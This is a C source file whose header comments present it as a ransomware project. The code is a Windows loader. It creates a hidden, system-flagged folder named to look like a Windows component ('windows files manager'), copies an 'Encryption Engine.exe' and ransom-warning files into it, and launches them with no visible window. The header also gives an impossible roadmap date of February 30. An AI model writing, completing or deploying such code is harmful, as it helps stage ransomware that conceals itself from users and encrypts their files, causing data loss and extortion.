//Made by Youssef Khaled (jo), also known as Hevo_Qmpo
//A ransomware program designed in native C to be as fast as possible This project was created on 2/23/2026 and a roadmap will be added to it on 2/30/2026.
//Warning____This project may contain some bugs which will be fixed as soon as possible.

#include <windows.h>

#define mem_zero(ptr, size) for(int i=0; i < (int)size; i++) ((char*)ptr)[i] = 0;

void EntryPoint() {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    char* lastSlash = currentPath;
    for (char* p = currentPath; *p; p++) {
        if (*p == '\\') lastSlash = p;
    }
    *(lastSlash + 1) = '\0';

    char targetDir[MAX_PATH];
    char userName[256];
    DWORD userLen = 256;
    GetWindowsDirectoryA(targetDir, MAX_PATH);
    targetDir[3] = '\0'; 
    lstrcatA(targetDir, "Users\\");

    if (GetUserNameA(userName, &userLen)) {
        lstrcatA(targetDir, userName);
        lstrcatA(targetDir, "\\windows files manager\\");
    } else {
        lstrcatA(targetDir, "windows files manager\\");
    }

    CreateDirectoryA(targetDir, NULL);
    SetFileAttributesA(targetDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    const char* files[] = { 
        "Encryption Engine.exe", 
        "warning.exe", 
        "warning.png" 
    };

    char srcFile[MAX_PATH];
    char dstFile[MAX_PATH];

    for (int i = 0; i < 3; i++) {
        lstrcpyA(srcFile, currentPath);
        lstrcatA(srcFile, files[i]);

        lstrcpyA(dstFile, targetDir);
        lstrcatA(dstFile, files[i]);

        if (CopyFileA(srcFile, dstFile, FALSE)) {
            SetFileAttributesA(dstFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    }

    char exeToRun[MAX_PATH];
    lstrcpyA(exeToRun, targetDir);
    lstrcatA(exeToRun, "Encryption Engine.exe");

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    mem_zero(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(exeToRun, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, targetDir, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    lstrcpyA(exeToRun, targetDir);
    lstrcatA(exeToRun, "warning.exe");
    if(CreateProcessA(exeToRun, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, targetDir, &si, &pi)){
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);    
    }

    ExitProcess(0);
}